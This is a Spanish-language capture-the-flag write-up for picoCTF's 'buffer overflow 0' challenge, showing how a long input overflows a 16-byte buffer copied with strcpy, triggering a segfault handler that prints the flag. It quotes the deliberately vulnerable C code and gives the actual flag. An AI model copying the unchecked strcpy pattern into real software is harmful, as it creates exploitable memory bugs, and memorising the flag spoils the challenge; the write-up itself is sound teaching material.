Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/520/vuln). You can view source [here](https://artifacts.picoctf.net/c/520/vuln.c). And connect with it using: `nc saturn.picoctf.net 53935`

Hints:
1. How can you trigger the flag to print?
2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
3. Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución
Ejecutando el archivo podemos observar que nos pide que creemos un archivo con nombre **"flag.txt"**
``` bash
echo 'flag{dummi}' > flag.txt
```

ejecutando nuevamente el archivo nos pedira que le demos una entrada, por lo que agregamos en la entrada una cadena de nás de 20 caracteres.
``` bash
holiwiscach@ubuntu:~/buffer_overflow0$ ./vuln 
Input: slkdjalsdjlaskdjaslkdjaslkjdalksjdlaskdj
flag{dummi}

```

¿Qué paso realmente? 
Mirando el código en C podemos darnos cuenta que en el método **vuln** solo hace aceptación de 16 caracteres, en caso contrario se desborda y hace que nos entregue la banedra **dummi**.

``` c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your>
                    "own debugging flag.\n");
    exit(0);
  }

```

Entonces entrando desde el servidor y aplicando el mismo método podemos obtener la badnera.
``` bash
holiwiscach@ubuntu:~/buffer_overflow0$ nc saturn.picoctf.net 53935
Input: saldhlakshdlashdlkaslkdlashdklsadasdasdsadklhsklkashdklahsdklhasdklhaslkhdskdahhkx<jxjk<hzkkzjhzk
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}

```

bandera:
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
